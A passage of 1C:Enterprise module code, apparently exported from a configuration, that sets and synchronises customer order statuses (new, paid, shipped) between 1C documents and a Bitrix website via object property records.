			Если ИсточникОплачено ИЛИ ЕстьОплатаЗаказа(Сделка) Тогда
				ЗадатьСтатусЗаказа(Сделка, КодСвойстваЗаказа, КодЗначенияСвойстваОплаченКОтгрузке);
				//Если ЗначениеЗаполнено(ИсточникДатаОплаты) Тогда
				//	НоваяДатаЗаказа 		= Формат(ИсточникДатаОплаты, ""ДФ=yyyy-MM-ddTHH:mm:ss"");
				//	СвойствоДатаОплатыУспех = ЗаписатьЗначениеСвойства(Сделка, КодСвойстваДатаОплаты, НоваяДатаЗаказа);
				//КонецЕсли;
			Иначе
				ЗадатьСтатусЗаказа(Сделка, КодСвойстваЗаказа, КодЗначенияСвойстваНовый);
			КонецЕсли;
			//ЗначениеСвойства 	= ПолучитьЗначениеСвойства(КодСвойстваЗаказа, КодЗначенияСвойства);
			ИзменениеУспех 		= ЗаписатьЗначениеСвойства(ИсточникСсылка, ПлатежноеПоручениеДатаОплаты, """"); // Т.к. на сайте дата оплаты сразу переводит сделку в завершённую
			//ЗадатьСтатусЗаказа(ИсточникСсылка, ПлатежноеПоручениеДатаОплаты, """"); // Т.к. на сайте дата оплаты сразу переводит сделку в завершённую 
		Иначе
			ЗадатьСтатусЗаказа(Сделка, КодСвойстваЗаказа, КодЗначенияСвойстваПодтвержден);	
		КонецЕсли;
		
		Успех = Истина;
		
	КонецЕсли;

	Возврат Успех;
	
КонецФункции // ПлатежноеПоручениеУстановитьСвойства()
 
Функция РеализацияТоваровУслугУстановитьСвойства(Источник)
	
	Успех = Ложь;
	
	ИсточникСсылка 		= Источник.Ссылка;
	ИсточникПроведен 	= Источник.Проведен;
	ИсточникСделка 		= Источник.Сделка;
	
	Если НЕ ЗначениеЗаполнено(ИсточникСделка) Тогда
		Возврат Успех;	
	КонецЕсли;
	
	КодСвойстваДатаОплаты 	= ""00000000057""; // Свойство дата оплаты
	
	ИсточникСделкаЗаказПодтвержден = ИсточникСделка.ЗаказПодтвержден;
	
	Если Истина Тогда // ИсточникПроведен Тогда
		КодСвойстваЗаказа 		= ""00000000048""; // Свойство заказов
		КодСвойстваДатаОплаты 	= ""00000000057""; // Свойство дата оплаты
		
		КодЗначенияСвойстваНовый 	= ""000000232""; // Новый
		КодЗначенияСвойстваОплачен 	= ""000000234""; // Оплачен
		КодЗначенияСвойстваПодтвержден 	= ""000000236""; // Подтвержден
		КодЗначенияСвойстваОтправленКлиенту = ""000000233""; // Отправлен клиенту
		
		КодЗначенияСвойстваОплаченКОтгрузке = ""000000237""; // Оплачен, в стадии отгрузки
		
		Если ИсточникСделкаЗаказПодтвержден Тогда
			ЗадатьСтатусЗаказа(ИсточникСделка, КодСвойстваЗаказа, КодЗначенияСвойстваОтправленКлиенту);
		ИначеЕсли ЕстьОплатаЗаказа(ИсточникСделка) Тогда
			ЗадатьСтатусЗаказа(ИсточникСделка, КодСвойстваЗаказа, КодЗначенияСвойстваОплачен);
			//	Если ЗначениеЗаполнено(ИсточникДатаОплаты) Тогда
			//		НоваяДатаЗаказа 		= Формат(ИсточникДатаОплаты, ""ДФ=yyyy-MM-ddTHH:mm:ss"");
			//		СвойствоДатаОплатыУспех = ЗаписатьЗначениеСвойства(ИсточникСделка, КодСвойстваДатаОплаты, НоваяДатаЗаказа);
			//	КонецЕсли;
			//Иначе
			//	ЗадатьСтатусЗаказа(ИсточникСделка, КодСвойстваЗаказа, КодЗначенияСвойстваНовый);
		КонецЕсли;
		
		Успех = Истина;
		
	КонецЕсли;

	Возврат Успех;	
	
КонецФункции // РеализацияТоваровУслугУстановитьСвойства()

Функция ЕстьОплатаЗаказа(ЗаказПокупателяСсылка) Экспорт
	
	Найден = Ложь;
	
	Запрос = Новый Запрос;
	Запрос.Текст = 
	""ВЫБРАТЬ ПЕРВЫЕ 1
	|	ПлатежноеПоручениеВходящее.Ссылка,
	|	ПлатежноеПоручениеВходящее.ДокументОснование,
	|	ПлатежноеПоручениеВходящее.ДатаОплаты
	|ИЗ
	|	Документ.ПлатежноеПоручениеВходящее КАК ПлатежноеПоручениеВходящее
	|ГДЕ
	|	ПлатежноеПоручениеВходящее.ДокументОснование = &ДокументОснование
	|	И ПлатежноеПоручениеВходящее.Оплачено
	|	И НЕ ПлатежноеПоручениеВходящее.ПометкаУдаления"";
	
	Запрос.УстановитьПараметр(""ДокументОснование"", ЗаказПокупателяСсылка);
	
	РезультатЗапроса = Запрос.Выполнить();
	
	Если НЕ РезультатЗапроса.Пустой() Тогда
		Найден = Истина;
	КонецЕсли; 
	
	Возврат Найден;
	
КонецФункции // ЕстьОплатаЗаказа()

Функция ЕстьРеализацияЗаказа(ЗаказПокупателяСсылка) Экспорт
	
	Найден = Ложь;
	
	Запрос = Новый Запрос;
	Запрос.Текст = 
	""ВЫБРАТЬ ПЕРВЫЕ 1
	|	РеализацияТоваровУслуг.Ссылка,
	|	РеализацияТоваровУслуг.Сделка
	|ИЗ
	|	Документ.РеализацияТоваровУслуг КАК РеализацияТоваровУслуг
	|ГДЕ
	|	РеализацияТоваровУслуг.Сделка = &Сделка
	|	И РеализацияТоваровУслуг.Проведен
	|	И НЕ РеализацияТоваровУслуг.ПометкаУдаления"";
	
	Запрос.УстановитьПараметр(""Сделка"", ЗаказПокупателяСсылка);
	
	РезультатЗапроса = Запрос.Выполнить();
	
	Если НЕ РезультатЗапроса.Пустой() Тогда
		Найден = Истина;
	КонецЕсли; 
	
	Возврат Найден;
	
КонецФункции // ЕстьОплатаЗаказа()

Функция СменаСтатуса(Документ) Экспорт 
	
	ДокументОплачен 			= Документ.Оплачен;
	
	ДокументЗаказПодтвержден 	= Документ.Заказ.ЗаказПодтвержден;
	ДокументЗаказ 				= Документ.Заказ;
	
	ЕстьРеализацияЗаказа = ЕстьРеализацияЗаказа(ДокументЗаказ);
	
//000000237	Выполнен и оплачен
//000000238	Не оплачен
//000000232	Новый
//000000235	Оплачен, в стадии отгрузки
//000000236	Отгружен, ждем оплату
//000000233	Отправлен клиенту
//000000234	Подтвержден

	// Коды свойств и их значений
	КодСвойстваЗаказа = ""00000000048""; // Свойство заказов
	
	КодЗначенияСвойстваНовый 		= ""000000232""; // Новый
	КодЗначенияСвойстваПодтвержден 	= ""000000234""; // Подтвержден
	КодЗначенияСвойстваОплачен 		= ""000000237""; // Оплачен
	КодЗначенияСвойстваОплаченКОтгрузке = ""000000235""; // Оплачен, в стадии отгрузки
	КодЗначенияСвойстваОтправленКлиенту = ""000000233""; // Отправлен клиенту
	КодЗначенияСвойстваОтправленЖдемОплату = ""000000236""; // Отгружен, ждем оплату
	
	НачальноеСостояниеСтатуса 	= КодЗначенияСвойстваОтправленКлиенту;
	КонечноеСостояниеСтатуса 	= КодЗначенияСвойстваОплачен;
	
	КодЗначениеСвойстваСтатусЗаказа = НачальноеСостояниеСтатуса; //КодЗначенияСвойстваНовый
	
	// Приминение статуса
	Если ДокументЗаказПодтвержден Тогда
		Если ЕстьРеализацияЗаказа И ДокументОплачен Тогда
			КодЗначениеСвойстваСтатусЗаказа = КонечноеСостояниеСтатуса; //КодЗначенияСвойстваОплачен
		ИначеЕсли ЕстьРеализацияЗаказа И НЕ ДокументОплачен Тогда
			КодЗначениеСвойстваСтатусЗаказа = КодЗначенияСвойстваОтправленЖдемОплату; // КодЗначенияСвойстваОтправленКлиенту
		ИначеЕсли НЕ ЕстьРеализацияЗаказа И НЕ ДокументОплачен Тогда
			КодЗначениеСвойстваСтатусЗаказа = КодЗначенияСвойстваПодтвержден;
		ИначеЕсли ДокументОплачен Тогда
			КодЗначениеСвойстваСтатусЗаказа = КодЗначенияСвойстваОплаченКОтгрузке;
		КонецЕсли; 
	Иначе
		Если ДокументОплачен Тогда
			Если ЕстьРеализацияЗаказа Тогда
				КодЗначениеСвойстваСтатусЗаказа = КонечноеСостояниеСтатуса; //КодЗначенияСвойстваОплачен
			Иначе
				КодЗначениеСвойстваСтатусЗаказа = КодЗначенияСвойстваОплаченКОтгрузке;
			КонецЕсли; 
		КонецЕсли;
	КонецЕсли; 
	//ЗадатьСтатусЗаказа(ДокументЗаказ, КодСвойстваЗаказа, КодЗначенияСвойстваОплаченКОтгрузке);	
	
	Если ТипЗнч(Документ.Объект) = Тип(""ДокументСсылка.ЗаказПокупателя"") Тогда
		ЗначениеСвойстваСтатусЗаказа 	= ПолучитьЗначениеСвойства(КодСвойстваЗаказа, КодЗначениеСвойстваСтатусЗаказа);
		Документ.СвойствоСтатусЗаказа 	= ЗначениеСвойстваСтатусЗаказа;
	КонецЕсли; 
	
	КонечныйСтатус = КодЗначениеСвойстваСтатусЗаказа = КодЗначенияСвойстваОплачен; // Совсем конечный статус (типа ""Выполнен"")
	
	Возврат КонечныйСтатус;
	
КонецФункции // СменаСтатуса()
 
// Дописать в ОМ -\ Б_ПроцедурыИФункцииВыгрузкиДанныхНаСайт -\ ВыгрузитьЗаказXDTO
// После строки: XDTOЗначенияРеквизитов 		= ПараметрыОбмена.МояФабрикаXDTO.Создать(XDTOЗначенияРеквизитовТип); 
//МожноВыводитьИнфоПоОплате 	= АйТи_Доработки.СменаСтатуса(Документ);
//Документ.Оплачен 			= МожноВыводитьИнфоПоОплате;

//--- ====== Битрикс. Статусы [ АйТи КучеровРМ 20.09.2018 ТЗ № ИС00-004698 ] ================================================ 

#КонецОбласти
"}
},
{0,
{"Модуль Статусы (НЕ загружая инфо о счетах)",0,0,"","
////////////////////////////////////////////////////////////////////////////////
// Влюбленная в свое дело команда ООО «АйТи-Консалтинг»,
// г. Ярославль, ул. Советская, д.69, к.2, этаж 1,
// тел. (4852) 59-33-33, info@allzon.ru,
// https://itcons99.ru/, http://itcons76.ru/
////////////////////////////////////////////////////////////////////////////////

#Область БитриксСтатусы
	
//+++ ====== Битрикс. Статусы [ АйТи КучеровРМ 20.09.2018 ТЗ № ИС00-004698 ] ================================================

////////////////////////////////////////////////////////////////////////////////
// Свойства 

Функция ЗадатьСтатусЗаказа(Объект, КодСвойстваЗаказа, КодЗначенияСвойства, СтиратьДату = Истина)

	ЗначениеСвойства 	= ПолучитьЗначениеСвойства(КодСвойстваЗаказа, КодЗначенияСвойства);
	ИзменениеУспех 		= ЗаписатьЗначениеСвойства(Объект, КодСвойстваЗаказа, ЗначениеСвойства); 
	
	Если СтиратьДату Тогда
		КодСвойстваДатаОплаты 	= ""00000000057""; // Свойство дата оплаты
		СвойствоДатаОплатыУспех = ЗаписатьЗначениеСвойства(Объект, КодСвойстваДатаОплаты, """");
	КонецЕсли; 
	
	Возврат ИзменениеУспех;
	
КонецФункции // ОбновитьСтатусЗаказа()
 
Функция ЗаписатьЗначениеСвойства(ОбъектСсылка, КодСвойстваОбъекта, Значение) 
	
	НаборЗаписейЗначенияСвойств = РегистрыСведений.ЗначенияСвойствОбъектов.СоздатьНаборЗаписей();
	
	Если Значение <> Неопределено Тогда
		Запись 			= НаборЗаписейЗначенияСвойств.Добавить();
		Запись.Объект   = ОбъектСсылка;
		Свойство 		= ПланыВидовХарактеристик.СвойстваОбъектов.НайтиПоКоду(КодСвойстваОбъекта);
		Запись.Свойство = Свойство.Ссылка;
		Запись.Значение = Значение;
		
		НаборЗаписейЗначенияСвойств.Отбор.Объект.Установить(ОбъектСсылка);
		НаборЗаписейЗначенияСвойств.Отбор.Свойство.Установить(Свойство); //.Ссылка
		
		Попытка
			НаборЗаписейЗначенияСвойств.Записать();
			Возврат Истина;
		Исключение
			//Сообщить(""Не удалось записать значения свойств:"" + Символы.ПС + ОписаниеОшибки());
			Возврат Ложь;
		КонецПопытки;
	КонецЕсли;
	
	Возврат Ложь; 
	
КонецФункции

Функция ЗаписатьЗначенияСвойстваСтруктура(ОбъектСсылка, СтруктураСвойства) 
	
	НаборЗаписейЗначенияСвойств = РегистрыСведений.ЗначенияСвойствОбъектов.СоздатьНаборЗаписей();
	
	Если ЗначениеЗаполнено(СтруктураСвойства.Значение) Тогда
		Запись 			= НаборЗаписейЗначенияСвойств.Добавить();
		Запись.Объект   = ОбъектСсылка;
		Свойство 		= ПланыВидовХарактеристик.СвойстваОбъектов.НайтиПоКоду(СтруктураСвойства.КодСвойстваОбъекта);
		Запись.Свойство = Свойство.Ссылка;
		Запись.Значение = СтруктураСвойства.Значение;
	КонецЕсли;
	
	НаборЗаписейЗначенияСвойств.Отбор.Объект.Установить(ОбъектСсылка);
	НаборЗаписейЗначенияСвойств.Отбор.Свойство.Установить(Свойство); //.Ссылка
	
	Попытка
		НаборЗаписейЗначенияСвойств.Записать();
	Исключение
		Сообщить(""Не удалось записать значения свойств:"" + Символы.ПС + ОписаниеОшибки());
		Возврат Ложь;
	КонецПопытки;
	
	Возврат Истина; 
	
КонецФункции

//Функция ПолучитьЗначениеСвойстваОбъекта
//-------------------------------------------------------------------------
//Параметры:
//		Объект - Ссылка - Ссылка на объект, свойство которого надо получить
//		КодСвойстваОбъекта - Строка - Код свойства, значения которого получаем
//		НазначениеСвойств - ПланВидовХарактеристикСсылка.НазначенияСвойствКатегорийОбъектов - Напр., ПланыВидовХарактеристик.НазначенияСвойствКатегорийОбъектов.Справочник_Контрагенты
//		Параметр - Тип - описание
//Возвращаемое значение:
//		СправочникСсылка.ЗначенияСвойствОбъектов - Значение свойства
//-------------------------------------------------------------------------
//автор: КучеровРМ 07.09.2018 
Функция ПолучитьЗначениеСвойстваОбъекта(Объект, КодСвойстваОбъекта, НазначениеСвойств) Экспорт
	
	Запрос = Новый Запрос;
	Запрос.Текст = 
	""ВЫБРАТЬ ПЕРВЫЕ 1
	|	СвойстваОбъектов.Наименование КАК СвойстваОбъектовНаименование,
	|	СвойстваОбъектов.ПометкаУдаления КАК ПометкаУдаления,
	|	СвойстваОбъектов.Ссылка КАК Свойство,
	|	ЗначенияСвойствОбъектов.Значение КАК Значение
	|ИЗ
	|	(ВЫБРАТЬ
	|		СвойстваОбъектов.Ссылка КАК Ссылка,
	|		СвойстваОбъектов.Наименование КАК Наименование,
	|		СвойстваОбъектов.ПометкаУдаления КАК ПометкаУдаления
	|	ИЗ
	|		ПланВидовХарактеристик.СвойстваОбъектов КАК СвойстваОбъектов
	|	ГДЕ
	|		СвойстваОбъектов.НазначениеСвойства В(&НазначениеСвойств)) КАК СвойстваОбъектов
	|		ЛЕВОЕ СОЕДИНЕНИЕ РегистрСведений.ЗначенияСвойствОбъектов КАК ЗначенияСвойствОбъектов
	|		ПО (ЗначенияСвойствОбъектов.Свойство = СвойстваОбъектов.Ссылка)
	|			И (ЗначенияСвойствОбъектов.Объект = &ОбъектОтбораЗначений)
	|		ЛЕВОЕ СОЕДИНЕНИЕ РегистрСведений.НазначенияСвойствОбъектов КАК НазначенияСвойствОбъектов
	|		ПО (НазначенияСвойствОбъектов.Свойство = СвойстваОбъектов.Ссылка)
	|			И (ЗначенияСвойствОбъектов.Значение ЕСТЬ NULL )
	|ГДЕ
	|	(НазначенияСвойствОбъектов.Объект ЕСТЬ NULL 
	|			ИЛИ НазначенияСвойствОбъектов.Объект В (&СписокНазначенийСвойств))
	|	И СвойстваОбъектов.Ссылка.Код = &КодСвойстваОбъекта
	|
	|УПОРЯДОЧИТЬ ПО
	|	СвойстваОбъектовНаименование"";
	
	//КодСвойстваОбъекта 		= ""00000000048"";
	//НазначениеСвойств 		= ПланыВидовХарактеристик.НазначенияСвойствКатегорийОбъектов.Справочник_Контрагенты;
	ОбъектОтбораЗначений 	= Объект;
	СписокНазначенийСвойств = Объект;
	
	Запрос.УстановитьПараметр(""КодСвойстваОбъекта""	, КодСвойстваОбъекта);
	Запрос.УстановитьПараметр(""НазначениеСвойств""	, НазначениеСвойств);
	Запрос.УстановитьПараметр(""ОбъектОтбораЗначений"", ОбъектОтбораЗначений);
	Запрос.УстановитьПараметр(""СписокНазначенийСвойств"", СписокНазначенийСвойств);

	РезультатЗапроса = Запрос.Выполнить();
	
	ЗначениеСвойства = Неопределено;
	Если НЕ РезультатЗапроса.Пустой() Тогда
		ВыборкаДетальныеЗаписи = РезультатЗапроса.Выбрать();
		Если ВыборкаДетальныеЗаписи.Следующий() Тогда
			ВыборкаДетальныеЗаписиЗначение = ВыборкаДетальныеЗаписи.Значение;
			Если ВыборкаДетальныеЗаписиЗначение <> NULL Тогда
				ЗначениеСвойства = ВыборкаДетальныеЗаписиЗначение;
			Иначе
				ЗначениеСвойства = Неопределено;
			КонецЕсли
		КонецЕсли;
	КонецЕсли;

	Возврат ЗначениеСвойства;
	
КонецФункции // ПолучитьЗначениеСвойстваОбъекта()

//Функция ПолучитьЗначениеСвойства
//-------------------------------------------------------------------------
//Параметры:
//		КодСвойства - Строка - КодСвойства
//		КодЗначенияСвойства - Строка - КодЗначенияСвойства
//Возвращаемое значение:
//		Массив - Массив Значений заданного свойства, с типом СправочникСсылка.ЗначенияСвойствОбъектов
//		СправочникСсылка.ЗначенияСвойствОбъектов - Значение свойства, если получаем 1 элемент по коду
//		Неопределено - Если элементов 0
//-------------------------------------------------------------------------
//автор: КучеровРМ 07.09.2018 
Функция ПолучитьЗначениеСвойства(КодСвойства, КодЗначенияСвойства = """") Экспорт

	КодЗначенияСвойстваЗаполнен = НЕ ПустаяСтрока(КодЗначенияСвойства);
	Если КодЗначенияСвойстваЗаполнен Тогда
		ЗапросВЫБРАТЬ = ""ПЕРВЫЕ 1"";
		ЗапросКодЗначенияСвойства = ""
		|	И ЗначенияСвойствОбъектов.Код = &КодЗначенияСвойства"";
	Иначе
		ЗапросВЫБРАТЬ = """";
		ЗапросКодЗначенияСвойства = """";
	КонецЕсли;
	
	Запрос = Новый Запрос;
	Запрос.Текст = 
	""ВЫБРАТЬ "" + ЗапросВЫБРАТЬ + ""
	|	ЗначенияСвойствОбъектов.Ссылка,
	|	ЗначенияСвойствОбъектов.ВерсияДанных,
	|	ЗначенияСвойствОбъектов.ПометкаУдаления,
	|	ЗначенияСвойствОбъектов.Предопределенный,
	|	ЗначенияСвойствОбъектов.Владелец,
	|	ЗначенияСвойствОбъектов.Родитель,
	|	ЗначенияСвойствОбъектов.ЭтоГруппа,
	|	ЗначенияСвойствОбъектов.Код,
	|	ЗначенияСвойствОбъектов.Наименование
	|ИЗ
	|	Справочник.ЗначенияСвойствОбъектов КАК ЗначенияСвойствОбъектов
	|ГДЕ
	|	ЗначенияСвойствОбъектов.Владелец.Код = &КодСвойства"";
	
	Если КодЗначенияСвойстваЗаполнен Тогда // Значит выводим одно значение соогласно переданому коду
		Запрос.Текст = Запрос.Текст + ЗапросКодЗначенияСвойства;
		Запрос.УстановитьПараметр(""КодЗначенияСвойства"", КодЗначенияСвойства);
	КонецЕсли;
	
	Запрос.УстановитьПараметр(""КодСвойства"", КодСвойства);
	
	РезультатЗапроса = Запрос.Выполнить();
	
	ЗначениеСвойства = Новый Массив;
	Если НЕ РезультатЗапроса.Пустой() Тогда
		ВыборкаДетальныеЗаписи = РезультатЗапроса.Выбрать();
		Пока ВыборкаДетальныеЗаписи.Следующий() Цикл
			ВыборкаДетальныеЗаписиСсылка = ВыборкаДетальныеЗаписи.Ссылка;
			ЗначениеСвойства.Добавить(ВыборкаДетальныеЗаписиСсылка);
			
			Если КодЗначенияСвойстваЗаполнен Тогда // Значит ожидаем одно значение согласно коду
				Прервать; 	
			КонецЕсли; 
		КонецЦикла;
	КонецЕсли;

	ЗначениеСвойстваКоличество = ЗначениеСвойства.Количество();
	Если ЗначениеСвойстваКоличество > 0 Тогда
		Если ЗначениеСвойстваКоличество > 1 Тогда
			Возврат ЗначениеСвойства;
		Иначе
			Возврат ЗначениеСвойства[0];
		КонецЕсли;
	Иначе
		Возврат Неопределено;
	КонецЕсли;
	
	Возврат ЗначениеСвойства; // На всякий случай
	
КонецФункции // ПолучитьЗначениеЗначениеСвойства()

////////////////////////////////////////////////////////////////////////////////
// Битрикс 

Функция ПлатежноеПоручениеУстановитьСвойства(Источник)

	Успех = Ложь;
	
	ИсточникСсылка 		= Источник.Ссылка;
	ИсточникОплачено 	= Источник.Оплачено;
	ИсточникДатаОплаты 	= Источник.ДатаОплаты;
	
	ИсточникРасшифровкаПлатежа = Источник.РасшифровкаПлатежа;
	
	Сделка = Неопределено;
	Если ИсточникРасшифровкаПлатежа.Количество() > 0 Тогда
		Сделка = ИсточникРасшифровкаПлатежа[0].Сделка;
	КонецЕсли;
	
	Если НЕ ЗначениеЗаполнено(Сделка) Тогда
		Возврат Успех;	
	КонецЕсли;
	
	КодСвойстваДатаОплаты 	= ""00000000057""; // Свойство дата оплаты
	
	Если ЗначениеЗаполнено(Сделка) Тогда
		СделкаЗаказПодтвержден 	= Сделка.ЗаказПодтвержден;
		
		КодСвойстваЗаказа 		= ""00000000048""; // Свойство заказов
		КодСвойстваДатаОплаты 	= ""00000000057""; // Свойство дата оплаты
		
		КодЗначенияСвойстваНовый 	= ""000000232""; // Новый
		КодЗначенияСвойстваОплачен 	= ""000000233""; // Оплачен
		КодЗначенияСвойстваПодтвержден 	= ""000000236""; // Подтвержден
		КодЗначенияСвойстваОплаченКОтгрузке = ""000000237""; // Оплачен, в стадии отгрузки
		
		ПлатежноеПоручениеДатаОплаты = ""00000000049"";
		
		Если НЕ СделкаЗаказПодтвержден Тогда
			Если ИсточникОплачено ИЛИ ЕстьОплатаЗаказа(Сделка) Тогда
				ЗадатьСтатусЗаказа(Сделка, КодСвойстваЗаказа, КодЗначенияСвойстваОплаченКОтгрузке);
				//Если ЗначениеЗаполнено(ИсточникДатаОплаты) Тогда
				//	НоваяДатаЗаказа 		= Формат(ИсточникДатаОплаты, ""ДФ=yyyy-MM-ddTHH:mm:ss"");
				//	СвойствоДатаОплатыУспех = ЗаписатьЗначениеСвойства(Сделка, КодСвойстваДатаОплаты, НоваяДатаЗаказа);
				//КонецЕсли;
			Иначе
				ЗадатьСтатусЗаказа(Сделка, КодСвойстваЗаказа, КодЗначенияСвойстваНовый);
			КонецЕсли;
			//ЗначениеСвойства 	= ПолучитьЗначениеСвойства(КодСвойстваЗаказа, КодЗначенияСвойства);
			ИзменениеУспех 		= ЗаписатьЗначениеСвойства(ИсточникСсылка, ПлатежноеПоручениеДатаОплаты, """"); // Т.к. на сайте дата оплаты сразу переводит сделку в завершённую
			//ЗадатьСтатусЗаказа(ИсточникСсылка, ПлатежноеПоручениеДатаОплаты, """"); // Т.к. на сайте дата оплаты сразу переводит сделку в завершённую 
		Иначе
			ЗадатьСтатусЗаказа(Сделка, КодСвойстваЗаказа, КодЗначенияСвойстваПодтвержден);	
		КонецЕсли;
		
		Успех = Истина;
		
	КонецЕсли;

	Возврат Успех;
	
КонецФункции // ПлатежноеПоручениеУстановитьСвойства()
 
Функция РеализацияТоваровУслугУстановитьСвойства(Источник)
	
	Успех = Ложь;
	
	ИсточникСсылка 		= Источник.Ссылка;
	ИсточникПроведен 	= Источник.Проведен;
	ИсточникСделка 		= Источник.Сделка;
	
	Если НЕ ЗначениеЗаполнено(ИсточникСделка) Тогда
		Возврат Успех;	
	КонецЕсли;
	
	КодСвойстваДатаОплаты 	= ""00000000057""; // Свойство дата оплаты
	
	ИсточникСделкаЗаказПодтвержден = ИсточникСделка.ЗаказПодтвержден;
	
	Если Истина Тогда // ИсточникПроведен Тогда
		КодСвойстваЗаказа 		= ""00000000048""; // Свойство заказов
		КодСвойстваДатаОплаты 	= ""00000000057""; // Свойство дата оплаты
		
		КодЗначенияСвойстваНовый 	= ""000000232""; // Новый
		КодЗначенияСвойстваОплачен 	= ""000000234""; // Оплачен
		КодЗначенияСвойстваПодтвержден 	= ""000000236""; // Подтвержден
		КодЗначенияСвойстваОтправленКлиенту = ""000000233""; // Отправлен клиенту
		
		КодЗначенияСвойстваОплаченКОтгрузке = ""000000237""; // Оплачен, в стадии отгрузки
		
		Если ИсточникСделкаЗаказПодтвержден Тогда
			ЗадатьСтатусЗаказа(ИсточникСделка, КодСвойстваЗаказа, КодЗначенияСвойстваОтправленКлиенту);
		ИначеЕсли ЕстьОплатаЗаказа(ИсточникСделка) Тогда
			ЗадатьСтатусЗаказа(ИсточникСделка, КодСвойстваЗаказа, КодЗначенияСвойстваОплачен);
			//	Если ЗначениеЗаполнено(ИсточникДатаОплаты) Тогда
			//		НоваяДатаЗаказа 		= Формат(ИсточникДатаОплаты, ""ДФ=yyyy-MM-ddTHH:mm:ss"");
			//		СвойствоДатаОплатыУспех = ЗаписатьЗначениеСвойства(ИсточникСделка, КодСвойстваДатаОплаты, НоваяДатаЗаказа);
			//	КонецЕсли;
			//Иначе
			//	ЗадатьСтатусЗаказа(ИсточникСделка, КодСвойстваЗаказа, КодЗначенияСвойстваНовый);
		КонецЕсли;
		
		Успех = Истина;
		
	КонецЕсли;

	Возврат Успех;	
	
КонецФункции // РеализацияТоваровУслугУстановитьСвойства()

Функция ЕстьОплатаЗаказа(ЗаказПокупателяСсылка) Экспорт
	
	Найден = Ложь;
	
	Запрос = Новый Запрос;
	Запрос.Текст = 
	""ВЫБРАТЬ ПЕРВЫЕ 1
	|	ПлатежноеПоручениеВходящее.Ссылка,
	|	ПлатежноеПоручениеВходящее.ДокументОснование,
	|	ПлатежноеПоручениеВходящее.ДатаОплаты
	|ИЗ
	|	Документ.ПлатежноеПоручениеВходящее КАК ПлатежноеПоручениеВходящее
	|ГДЕ
	|	ПлатежноеПоручениеВходящее.ДокументОснование = &ДокументОснование
	|	И ПлатежноеПоручениеВходящее.Оплачено
	|	И НЕ ПлатежноеПоручениеВходящее.ПометкаУдаления"";
	
	Запрос.УстановитьПараметр(""ДокументОснование"", ЗаказПокупателяСсылка);
	
	РезультатЗапроса = Запрос.Выполнить();
	
	Если НЕ РезультатЗапроса.Пустой() Тогда
		Найден = Истина;
	КонецЕсли; 
	
	Возврат Найден;
	
КонецФункции // ЕстьОплатаЗаказа()

Функция ЕстьРеализацияЗаказа(ЗаказПокупателяСсылка) Экспорт
	
	Найден = Ложь;
	
	Запрос = Новый Запрос;
	Запрос.Текст = 
	""ВЫБРАТЬ ПЕРВЫЕ 1
	|	РеализацияТоваровУслуг.Ссылка,
	|	РеализацияТоваровУслуг.Сделка
	|ИЗ
	|	Документ.РеализацияТоваровУслуг КАК РеализацияТоваровУслуг
	|ГДЕ
	|	РеализацияТоваровУслуг.Сделка = &Сделка
	|	И РеализацияТоваровУслуг.Проведен
	|	И НЕ РеализацияТоваровУслуг.ПометкаУдаления"";
	
	Запрос.УстановитьПараметр(""Сделка"", ЗаказПокупателяСсылка);
	
	РезультатЗапроса = Запрос.Выполнить();
	
	Если НЕ РезультатЗапроса.Пустой() Тогда
		Найден = Истина;
	КонецЕсли; 
	
	Возврат Найден;
	
КонецФункции // ЕстьОплатаЗаказа()

//Функция приминения статуса сделки на сайте (Б24) и в 1С
//-------------------------------------------------------------------------
//Параметры:
//		Документ - Тип - Переменная ""Документ"" из ОМ -\ Б_ПроцедурыИФункцииВыгрузкиДанныхНаСайт -\ ВыгрузитьЗаказXDTO, ВыгрузитьОплатуXDTO
//		ПрименитьСтатус - Булево - Нужно ли применять ""логичный"" статус к документу в 1С (приминяется для изменений документа уже вне изменений файла для отправки на сайт
//Возвращаемое значение:
//		Булево - КонечныйСтатус или МожноПрименитьПромежуточныйСтатус
//-------------------------------------------------------------------------
// ПрименитьПромежуточныйСтатус, т.к. иначе для конечного статуса ""Оплачен"" будет ""Status error"", конечный статус надо применять ничего не меняя,
// после чего надо заказу применить конечный статус ""Оплачено"", иначе он так и не присвоится и он будет ""скакать"" между последним и предпоследним.
// Основная логика такая, что пока на сайт не попадает инфо по оплате (Документ.Оплачен = Ложь), будут меняться промежуточные статусы, а для приминения
// конечного статуса вообще не надо ничего менять до отправки, но после формирования файла выгрузки надо применить конечный статус свойству в заказе. 
//-------------------------------------------------------------------------
//автор: КучеровРМ 09.10.2018 
Функция ПрименитьПромежуточныйСтатус(Документ, ПрименитьСтатус = Ложь) Экспорт

	КодСвойстваЗаказа 			= ""00000000048""; 	// Свойство заказов
	КодЗначенияСвойстваОплачен 	= ""000000234""; 		// Оплачен
	
	ДокументЗаказ 				= Документ.Заказ;
	ДокументОплачен 			= Документ.Оплачен;
	ДокументЗаказПодтвержден 	= Документ.Заказ.ЗаказПодтвержден;
	ЕстьРеализацияЗаказа 		= ЕстьРеализацияЗаказа(ДокументЗаказ);
	
	// Логика приминения статуса
	КодПриминениеСтатуса 		= ПриминениеСтатуса(ДокументЗаказПодтвержден, ЕстьРеализацияЗаказа, ДокументОплачен, КодСвойстваЗаказа, КодЗначенияСвойстваОплачен);
	
	Если ПрименитьСтатус Тогда
		КонечныйСтатус 		= СменаСтатуса(Документ, КодСвойстваЗаказа, КодЗначенияСвойстваОплачен, КодПриминениеСтатуса);
	    Возврат КонечныйСтатус;
	КонецЕсли;
	
	МожноПрименитьПромежуточныйСтатус = КодПриминениеСтатуса <> КодЗначенияСвойстваОплачен;
	
	Если МожноПрименитьПромежуточныйСтатус Тогда
		//Если НЕ Документ.Оплачен Тогда // Это магия, только при этом условии встанет конечное состояние статуса сделки
			КонечныйСтатус 		= СменаСтатуса(Документ, КодСвойстваЗаказа, КодЗначенияСвойстваОплачен, КодПриминениеСтатуса);
			Документ.Оплачен 	= КонечныйСтатус;
		//КонецЕсли;
	Иначе
		
	КонецЕсли;
	
	Возврат МожноПрименитьПромежуточныйСтатус;

КонецФункции // ПрименитьПромежуточныйСтатус()
 
// Тут логика приминения статуса
// Вернёт КодЗначениеСвойстваСтатусЗаказа для приминения в 1С и на сайта
Функция ПриминениеСтатуса(ДокументЗаказПодтвержден, ЕстьРеализацияЗаказа, ДокументОплачен, КодСвойстваЗаказа, КодЗначенияСвойстваОплачен) Экспорт

	// Коды свойств и их значений
	//КодСвойстваЗаказа = ""00000000048""; // Свойство заказов
	
	КодЗначенияСвойстваНовый 		= ""000000232""; // Новый
	КодЗначенияСвойстваПодтвержден 	= ""000000236""; // Подтвержден
